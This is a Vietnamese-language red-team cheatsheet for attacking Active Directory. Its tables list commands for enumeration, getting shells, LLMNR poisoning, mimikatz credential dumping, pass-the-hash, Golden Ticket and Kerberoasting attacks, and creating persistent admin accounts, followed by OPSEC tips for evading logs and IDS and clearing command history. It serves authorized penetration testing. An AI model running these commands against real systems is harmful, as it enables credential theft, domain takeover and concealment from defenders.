# 🛡️ Red Team AD Pentest Cheatsheet

Tổng hợp các câu lệnh khai thác Active Directory phổ biến.

---

## 🔍 Dò quét (Enumeration)
| Tool | Command | Mục đích |
| :--- | :--- | :--- |
| `nmap` | `nmap -sC -sV -p- <IP>` | Quét toàn bộ dịch vụ |
| `enum4linux` | `enum4linux -a <IP>` | Liệt kê thông tin SMB/Users |
| `crackmapexec` | `cme smb <IP> -u '' -p ''` | Quét Null Session SMB |

## 🚪 Khai thác & Chiếm quyền (Exploitation)
| Tool | Command | Mục đích |
| :--- | :--- | :--- |
| `evil-winrm` | `evil-winrm -i <IP> -u <User> -p <Pass>` | Lấy Shell qua WinRM |
| `responder` | `sudo responder -I eth0 -dw` | Giai đoạn Poisoning LLMNR/NBT-NS |
| `impacket` | `psexec.py domain/user:pass@IP` | Lấy shell qua SMB/Psexec |

## 👑 Leo thang đặc quyền & Duy trì (PrivEsc & Persistence)
| Tool | Command | Mục đích |
| :--- | :--- | :--- |
| `mimikatz` | `sekurlsa::logonpasswords` | Dump mật khẩu từ bộ nhớ (RAM) |
| `bloodhound` | `sharpbound.exe -c All` | Thu thập dữ liệu quan hệ AD |
| `evil-winrm` | `evil-winrm -i <IP> -u <User> -H <Hash>` | **Pass-the-Hash** (Xác thực bằng Hash) |
| `net user` | `net user <User> <Pass> /add` | Tạo user local mới (Persistence) |
| `net localgroup`| `net localgroup administrators <User> /add` | Gán quyền Admin cho user local |

## 🎟️ Kerberos Attacks
| Kỹ thuật | Command / Tool | Mô tả |
| :--- | :--- | :--- |
| **Golden Ticket** | `mimikatz "kerberos::golden ..."` | Đúc vé TGT giả mạo với Hash `krbtgt` |
| **Ticket Convert**| `impacket-ticketConverter v.kirbi v.ccache`| Chuyển đổi vé Windows sang Linux format |
| **Kerberoasting** | `GetUserSPNs.py -request` | Trộm TGS hash của các Service Account |

## ⚖️ Quy tắc vận hành chuyên nghiệp (ROE & OPSEC)
| Quy tắc | Chi tiết & Tại sao |
| :--- | :--- |
| **Hạn chế dùng `sudo`** | Tránh để lại log rõ ràng trong `/var/log/auth.log`. Ưu tiên `su -` hoặc leo thang qua binary có SUID/Cap. |
| **No Loud Scans** | Tránh `nmap -T4/T5`. Dùng `-T2` hoặc `--top-ports` để ẩn mình khỏi IDS. |
| **Clean as you go** | Xóa tệp tin rác, remove temporary users và dọn dẹp Command History trước khi logout. |
| **Timeline Documentation** | Ghi lại chính xác thời điểm thực hiện từng lệnh để đối soát (Deconfliction) với Blue Team. |
| **Pivot Stealthily** | Không dùng máy tấn công chính (Main C2) để kết nối trực tiếp đến mọi node. Dùng Tunneling. |


